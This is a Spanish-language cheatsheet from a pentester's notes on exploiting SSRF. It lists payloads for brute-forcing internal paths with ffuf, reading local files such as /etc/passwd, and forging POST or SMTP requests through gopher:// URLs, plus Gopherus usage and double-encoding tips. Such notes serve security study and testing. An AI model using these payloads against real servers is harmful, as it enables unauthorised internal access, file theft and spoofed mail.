---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
---
# SSRF - Explotación

***

## Cheatsheet

|**Técnica / Objetivo**|**Protocolo**|**Payload / Comando**|**Detalles y Notas**|
|---|---|---|---|
|**Enumeración de Directorios Internos**|`http://`|`ffuf -w wordlist.txt -u URL -d "param=http://interno/FUZZ.php" -fr "Error String"`|Utilizar [[ffuf]] para fuerza bruta sobre directorios internos. Es vital usar `-fr` (Filter Regex) para ocultar las respuestas de error estándar del servidor (404/403).|
|**Local File Inclusion (LFI)**|`file://`|`file:///etc/passwd`<br><br>  <br><br>`file:///C:/Windows/win.ini`|Si no hay validación de esquema, permite leer archivos del sistema de archivos local del servidor.|
|**Bypass de Método (GET a POST)**|`gopher://`|`gopher://<IP>:<PORT>/_POST%20/admin.php...`|El protocolo [[Gopher]] permite enviar bytes arbitrarios a un socket TCP. Útil para interactuar con formularios internos que requieren POST cuando el SSRF solo permite GET.|
|**Interacción con SMTP**|`gopher://`|`gopher://127.0.0.1:25/_MAIL%20FROM...`|Permite enviar correos electrónicos falsificados desde el `localhost` (puerto 25), a menudo confiable para el servidor de correo interno.|
|**Generación de Payloads (Gopherus)**|Script|`python2.7 gopherus.py --exploit [smtp\|mysql\|redis]`|Herramienta para automatizar la creación de URLs Gopher complejas. Soporta: [[MySQL]], [[PostgreSQL]], FastCGI, Redis, SMTP, Zabbix.|

### Consideraciones de Codificación

Al trabajar con el protocolo **Gopher**, la codificación es crítica para el éxito del exploit:

|**Paso**|**Acción**|**Razón**|
|---|---|---|
|**1. Estructura Raw**|Crear la petición HTTP/SQL/SMTP tal cual se enviaría por socket.|Gopher envía datos crudos.|
|**2. URL Encode**|Codificar caracteres especiales, especialmente saltos de línea (`%0D%0A`) y espacios (`%20`).|El formato de URL no soporta espacios ni saltos de línea directos.|
|**3. Doble URL Encode**|Volver a codificar el payload completo si se pasa como parámetro GET/POST.|El servidor web decodificará el parámetro una vez; el backend que realiza la petición SSRF necesita recibir los caracteres codificados para procesarlos correctamente.|

***

## Overview


***

## Notas Relacionadas


***
